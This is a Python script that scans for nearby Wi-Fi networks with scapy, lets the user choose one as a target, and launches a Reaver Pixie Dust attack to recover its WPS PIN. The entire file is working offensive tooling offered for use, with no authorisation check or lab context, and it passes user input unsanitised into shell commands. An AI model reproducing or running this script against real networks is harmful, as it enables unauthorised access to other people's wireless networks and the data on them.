# -*- coding: utf-8 -*-
# Script to scan Wi-Fi networks and run Pixie Dust attack using Reaver
from scapy.all import sniff, Dot11, Dot11Elt
import subprocess

interface = input("Enter the interface to use (e.g., wlan0): ")

# Enable monitor mode
subprocess.call(f"sudo ifconfig {interface} down", shell=True)
subprocess.call(f"sudo iwconfig {interface} mode monitor", shell=True)
subprocess.call(f"sudo ifconfig {interface} up", shell=True)

networks = []

def get_channel(pkt):
    elt = pkt.getlayer(Dot11Elt)
    while elt:
        if elt.ID == 3:
            return ord(elt.info)
        elt = elt.payload.getlayer(Dot11Elt)
    return None

def scan_networks(packet):
    if packet.haslayer(Dot11) and packet.type == 0 and packet.subtype == 8:
        ssid = packet.info.decode('utf-8', errors='ignore')
        bssid = packet.addr2
        channel = get_channel(packet)
        if channel is not None and not any(net['BSSID'] == bssid for net in networks):
            networks.append({'SSID': ssid, 'BSSID': bssid, 'Channel': channel})
            print(f"SSID: {ssid}, BSSID: {bssid}, Channel: {channel}")

print("Scanning for networks (press Ctrl+C to stop)...")
try:
    sniff(iface=interface, prn=scan_networks, store=False)
except KeyboardInterrupt:
    print("\nScanning stopped by user.")

# Display networks
print("\nAvailable networks:")
for idx, net in enumerate(networks):
    print(f"{idx}: {net['SSID']} ({net['BSSID']}) on Channel {net['Channel']}")

# User selects a target
try:
    choice = int(input("Enter the number of the network to attack: "))
    target = networks[choice]
except (ValueError, IndexError):
    print("Invalid selection.")
    exit(1)

command_pixie_dust = f"reaver -i {interface} -b {target['BSSID']} -c {target['Channel']} -K 1 -f -vvv"

def run_pixie_dust():
    try:
        print("\nRunning Pixie Dust attack...")
        process = subprocess.Popen(command_pixie_dust, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        if process.returncode == 0:
            print("Pixie Dust attack completed successfully.")
            print(stdout.decode())
        else:
            print("Error during Pixie Dust attack:")
            print(stderr.decode())
    except Exception as e:
        print(f"An error occurred: {e}")

run_pixie_dust()
